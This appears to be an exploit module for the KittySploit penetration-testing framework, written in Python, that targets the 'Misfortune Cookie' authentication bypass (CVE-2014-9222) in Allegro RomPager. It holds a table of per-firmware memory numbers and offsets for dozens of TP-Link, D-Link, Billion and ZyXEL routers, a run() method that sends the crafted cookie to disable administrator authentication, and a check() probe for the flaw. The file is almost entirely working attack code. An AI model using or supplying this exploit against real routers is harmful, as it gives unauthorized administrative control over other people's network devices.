from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re

class Module(Auxiliary, Http_client):
	
	__info__ = {
			'name': 'Allegro Software RomPager "Misfortune Cookie"',
			'description': "This module exploits HTTP servers that appear to be vulnerable to the"\
							"'Misfortune Cookie' vulnerability which affects Allegro Software"\
							"Rompager versions before 4.34 and can allow attackers to authenticate"\
							"to the HTTP service as an administrator without providing valid"\
							"credentials.",
			'author': 'KittySploit Team',
			'cve': '2014-9222',
			'version': {'Azmoon    AZ-D140W        2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1': 
							{'number': 107367693,
							'offset': 13}, # 0x803D5A79 
						'Billion   BiPAC 5102S     Av2.7.0.23 (UE0.B1C)':
							{'number': 107369694, 
							'offset': 13}, # 0x8032204d 
						'Billion   BiPAC 5102S     Bv2.7.0.23 (UE0.B1C)':
							{'number': 107369694,
							'offset': 13}, # 0x8032204d
						'Billion   BiPAC 5200      2.11.84.0(UE2.C2)3.11.11.6':
							{'number': 107369545,
							'offset': 9}, # 0x803ec2ad
						'Billion   BiPAC 5200      2_11_62_2_ UE0.C2D_3_10_16_0':
							{'number': 107371218,
							'offset': 21}, # 0x803c53e5
						'Billion   BiPAC 5200A     2_10_5 _0(RE0.C2)3_6_0_0':
							{'number': 107366366,
							'offset': 25}, # 0x8038a6e1
						'Billion   BiPAC 5200A     2_11_38_0 (RE0.C29)3_10_5_0':
							{'number': 107371453,
							'offset': 9}, # 0x803b3a51
						'Billion   BiPAC 5200GR4   2.11.91.0(RE2.C29)3.11.11.52':
							{'number': 107367690,
							'offset': 21}, # 0x803D8A51
						'Billion   BiPAC 5200SRD   2.10.5.0 (UE0.C2C) 3.6.0.0':
							{'number': 107368270,
							'offset': 1}, # 0x8034b109
						'Billion   BiPAC 5200SRD   2.12.17.0_UE2.C3_3.12.17.0':
							{'number': 107371378,
							'offset': 37}, # 0x8040587d
						'Billion   BiPAC 5200SRD   2_11_62_2(UE0.C3D)3_11_11_22':
							{'number': 107371218,
							'offset': 13}, # 0x803c49d5
						'D-Link    DSL-2520U       Z1 1.08 DSL-2520U_RT63261_Middle_East_ADSL':
							{'number': 107368902,
							'offset': 25}, # 0x803fea01
						'D-Link    DSL-2600U       Z1_DSL-2600U':
							{'number': 107366496,
							'offset': 13}, # 0x8040637d
						'D-Link    DSL-2600U       Z2_V1.08_ras':
							{'number': 107360133,
							'offset': 20}, # 0x803389B0
						'TP-Link   TD-8616         V2_080513':
							{'number': 107371483,
							'offset': 21}, # 0x80397055
						'TP-Link   TD-8816         V4_100528_Russia':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8816         V4_100524':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8816         V5_100528_Russia':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8816         V5_100524':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8816         V5_100903':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8816         V6_100907':
							{'number': 107371426,
							'offset': 17}, # 0x803c6e09
						'TP-Link   TD-8816         V7_111103':
							{'number': 107371161,
							'offset': 1}, # 0x803e1bd5
						'TP-Link   TD-8816         V7_130204':
							{'number': 107370211,
							'offset': 5}, # 0x80400c85
						'TP-Link   TD-8817         V5_100524':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8817         V5_100702_TR':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8817         V5_100903':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8817         V6_100907':
							{'number': 107369788,
							'offset': 1}, # 0x803b6e09
						'TP-Link   TD-8817         V6_101221':
							{'number': 107369788,
							'offset': 1}, # 0x803b6e09
						'TP-Link   TD-8817         V7_110826':
							{'number': 107369522,
							'offset': 25}, # 0x803d1bd5
						'TP-Link   TD-8817         V7_130217':
							{'number': 107369316,
							'offset': 21}, # 0x80407625
						'TP-Link   TD-8817         V7_120509':
							{'number': 107369321,
							'offset': 9},
						'TP-Link   TD-8817         V8_140311':
							{'number': 107351277,
							'offset': 20},
						'TP-Link   TD-8820         V3_091223':
							{'number': 107369768,
							'offset': 17},
						'TP-Link   TD-8840T        V1_080520':
							{'number': 107369845,
							'offset': 5},
						'TP-Link   TD-8840T        V2_100525':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8840T        V2_100702_TR':
							{'number': 107369790,
							'offset': 17}, # 0x803ae0b1
						'TP-Link   TD-8840T        V2_090609':
							{'number': 107369570,
							'offset': 1}, # 0x803c65d5
						'TP-Link   TD-8840T        V3_101208':
							{'number': 107369766,
							'offset': 17}, # 0x803c3e89
						'TP-Link   TD-8840T        V3_110221':
							{'number': 107369764,
							'offset': 5}, # 0x803d1a09
						'TP-Link   TD-8840T        V3_120531':
							{'number': 107369688,
							'offset':17}, # 0x803fed35
						'TP-Link   TD-W8101G       V1_090107':
							{'number': 107367772,
							'offset': 37}, # 0x803bf701
						'TP-Link   TD-W8101G       V1_090107':
							{'number': 107367808,
							'offset': 21}, # 0x803e5b6d
						'TP-Link   TD-W8101G       V2_100819':
							{'number': 107367751,
							'offset': 21}, # 0x803dc701
						'TP-Link   TD-W8101G       V2_101015_TR':
							{'number': 107367749,
							'offset': 13}, # 0x803e1829
						'TP-Link   TD-W8101G       V2_101101':
							{'number': 107367749,
							'offset': 13}, # 0x803e1829
						'TP-Link   TD-W8101G       V3_110119':
							{'number': 107367765,
							'offset': 25}, # 0x804bb941
						'TP-Link   TD-W8101G       V3_120213':
							{'number': 107367052,
							'offset': 25}, # 0x804e1ff9
						'TP-Link   TD-W8101G       V3_120604':
							{'number': 107365835,
							'offset': 1}, # 0x804f16a9
						'TP-Link   TD-W8151N       V3_120530':
							{'number': 107353867,
							'offset': 24}, # 0x8034F3A4
						'TP-Link   TD-W8901G       V1_080522':
							{'number': 107367787,
							'offset': 21}, # 0x803AB30D
						'TP-Link   TD-W8901G       V1,2_080522':
							{'number': 107368013,
							'offset': 5}, # 0x803AB30D
						'TP-Link   TD-W8901G       V2_090113_Turkish':
							{'number': 107368013,
							'offset': 5}, # 0x803AB30D
						'TP-Link   TD-W8901G       V3_140512':
							{'number': 107367854,
							'offset': 9}, # 0x803cf335
						'TP-Link   TD-W8901G       V3_100603':
							{'number': 107367751,
							'offset': 21}, # 0x803DC701
						'TP-Link   TD-W8901G       V3_100702_TR':
							{'number': 107367751,
							'offset': 21}, # 0x803DC701
						'TP-Link   TD-W8901G       V3_100901':
							{'number': 107367749,
							'offset': 13}, # 0x803E1829
						'TP-Link   TD-W8901G       V6_110119':
							{'number': 107367765,
							'offset': 25}, # 0x804BB941
						'TP-Link   TD-W8901G       V6_110915':
							{'number': 107367682,
							'offset': 21}, # 0x804D7CB9
						'TP-Link   TD-W8901G       V6_120418':
							{'number': 107365835,
							'offset': 1}, # 0x804F16A9
						'TP-Link   TD-W8901GB      V3_100727':
							{'number': 107367756,
							'offset': 13}, # 0x803dfbe9
						'TP-Link   TD-W8901GB      V3_100820':
							{'number': 107369393,
							'offset': 21}, # 0x803f1719
						'TP-Link   TD-W8901N       V1_111211':
							{'number': 107353880,
							'offset': 0}, # 0x8034FF94
						'TP-Link   TD-W8951ND      V1_101124,100723,100728':
							{'number': 107369839,
							'offset':  25}, # 0x803d2d61
						'TP-Link   TD-W8951ND      V1_110907':
							{'number': 107369876,
							'offset': 13}, # 0x803d6ef9
						'TP-Link   TD-W8951ND      V1_111125':
							{'number': 107369876,
							'offset': 13}, # 0x803d6ef9
						'TP-Link   TD-W8951ND      V3.0_110729_FI':
							{'number': 107366743,
							'offset': 21}, # 0x804ef189
						'TP-Link   TD-W8951ND      V3_110721':
							{'number': 107366743,
							'offset': 21}, # 0x804ee049
						'TP-Link   TD-W8951ND      V3_20110729_FI':
							{'number': 107366743,
							'offset': 21}, # 0x804ef189
						'TP-Link   TD-W8951ND      V4_120511':
							{'number': 107364759,
							'offset': 25}, # 0x80523979
						'TP-Link   TD-W8951ND      V4_120607':
							{'number': 107364759,
							'offset': 13}, # 0x80524A91
						'TP-Link   TD-W8951ND      V4_120912_FL':
							{'number': 107364760,
							'offset': 21}, # 0x80523859
						'TP-Link   TD-W8961NB      V1_110107':
							{'number': 107369844,
							'offset': 17}, # 0x803de3f1
						'TP-Link   TD-W8961NB      V1_110519':
							{'number': 107369844,
							'offset': 17}, # 0x803de3f1
						'TP-Link   TD-W8961NB      V2_120319':
							{'number': 107367629,
							'offset': 21}, # 0x80531859
						'TP-Link   TD-W8961NB      V2_120823':
							{'number': 107366421,
							'offset': 13}, # 0x80542e59
						'TP-Link   TD-W8961ND      V1_100722,101122':
							{'number': 107369839,
							'offset': 25}, # 0x803D2D61
						'TP-Link   TD-W8961ND      V1_101022_TR':
							{'number': 107369839,
							'offset': 25}, # 0x803D2D61
						'TP-Link   TD-W8961ND      V1_111125':
							{'number': 107369876,
							'offset': 13}, # 0x803D6EF9
						'TP-Link   TD-W8961ND      V2_120427':
							{'number': 107364732,
							'offset': 25}, # 0x8052e0e9
						'TP-Link   TD-W8961ND      V2_120710_UK':
							{'number': 107364771,
							'offset': 37}, # 0x80523AA9
						'TP-Link   TD-W8961ND      V2_120723_FI':
							{'number': 107364762,
							'offset': 29}, # 0x8052B6B1
						'TP-Link   TD-W8961ND      V3_120524,120808':
							{'number': 107353880,
							'offset': 0}, # 0x803605B4
						'TP-Link   TD-W8961ND      V3_120830':
							{'number': 107353414,
							'offset': 36}, # 0x803605B4
						'ZyXEL     P-660R-T3       3.40(BOQ.0)C0':
							{'number': 107369567,
							'offset': 21}, # 0x803db071
						'ZyXEL     P-660RU-T3      3.40(BJR.0)C0':
							{'number': 107369567,
							'offset': 21} # 0x803db071
						}						
	}

	def run(self):

		number = self.version('number')
		offset = self.version('offset')
		headers = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
				   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				   'Accept-language': 'sk,cs;q=0.8,en-US;q=0.5,en;q,0.3',
				   'Connection': 'keep-alive',
				   'Accept-Encoding': 'gzip, deflate',
				   'Cache-Control': 'no-cache',
				   'Cookie': 'C' + str(number) + '=' + 'B' * offset + '\x00'}

		response = self.http_request(
			method="GET",
			path="/",
			headers=headers
		)

		if response is not None and response.status_code <= 302:
			print_success(
				"Seems good but check " +
				"{}:{} ".format(self.target, self.port) +
				"using your browser to verify if authentication is disabled or not."
			)
			Vulnerable.SUCCESS()
			return True
		else:
			fail.NotVulnerable()
			return False
	
	def check(self):

		headers = {
			"User-Agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-language": "sk,cs;q=0.8,en-US;q=0.5,en;q,0.3",
			"Connection": "keep-alive",
			"Accept-Encoding": "gzip, deflate",
			"Cache-Control": "no-cache",
			"Cookie": "C107373883=/omg1337hax",
		}

		response = self.http_request(
							method="GET",
							path="/test",
							headers=headers
							)
		if response is None:
			fail.NotVulnerable()

		if response.status_code != 404:
			fail.NotVulnerable()
		else:
			if 'server' in response.headers:
				server = response.headers.get('server')

				if re.search('RomPager', server) is not None:
					if re.search('omg1337hax', response.text) is not None:
						return True
					else:
						fail.NotVulnerable()

		fail.NotVulnerable()
